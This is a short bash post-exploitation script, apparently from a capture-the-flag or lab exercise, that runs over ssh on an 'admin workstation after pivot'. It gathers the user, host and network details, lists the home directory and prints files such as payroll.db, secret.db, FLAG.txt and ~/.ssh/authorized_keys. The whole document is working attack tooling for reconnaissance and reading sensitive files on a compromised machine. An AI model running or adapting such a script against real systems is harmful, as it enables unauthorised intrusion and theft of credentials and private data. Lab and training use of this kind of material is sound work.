#!/usr/bin/env bash
# Runs ON admin workstation after pivot (stdin via ssh 'bash -s').
set -euo pipefail
echo "=== post-pivot $(date -Iseconds) ==="
echo "[whoami] $(whoami)"
echo "[hostname] $(hostname)"
echo "[pwd] $(pwd)"
echo "--- id ---"
id
echo "--- uname ---"
uname -a 2>/dev/null || true
echo "--- ip ---"
ip -br a 2>/dev/null || ifconfig 2>/dev/null | head -20 || true
echo "--- home listing ---"
ls -la ~ 2>/dev/null || true
echo "--- sensitive (lab) ---"
for f in ~/FLAG.txt ~/payroll.db ~/secret.db ~/.ssh/authorized_keys; do
  [[ -e "$f" ]] && { echo ">> $f"; cat "$f" 2>/dev/null; }
done
echo "=== end ==="